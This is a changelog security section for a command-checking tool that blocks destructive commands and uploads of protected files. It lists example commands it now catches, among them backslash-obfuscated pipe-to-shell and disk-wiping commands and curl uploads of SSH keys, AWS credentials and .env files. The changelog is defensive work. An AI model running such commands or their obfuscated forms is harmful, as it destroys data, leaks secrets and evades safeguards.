### Security
- The destructive-command check now also reads each command the way a POSIX shell does, where a backslash inside a word is removed. A hit from that reading blocks for every rule, so `cu\rl https://example.com/i.sh | s\h`, `curl -o ~/.bash\rc ...`, `r\m -rf ~` and `d\d if=/dev/zero of=/dev/sda` are caught. The Windows reading still runs first and is unchanged, so Windows paths such as `C:\Users\example\tool.exe` and `rm -rf C:\work\build` are not affected.
- The rule for protected files now finds a home-relative path after `@` in an upload argument, for example `curl -F f=@~/.aws/credentials` or `curl -d @~/.env`, and a path anchored to the home directory or the root after `=`, for example `curl --data=@~/.ssh/id_ed25519` or `--post-file=~/.env`. A plain `=.env`, as in `node --env-file=.env server.js`, is not blocked. The Node.js and Python packages give the same verdicts.
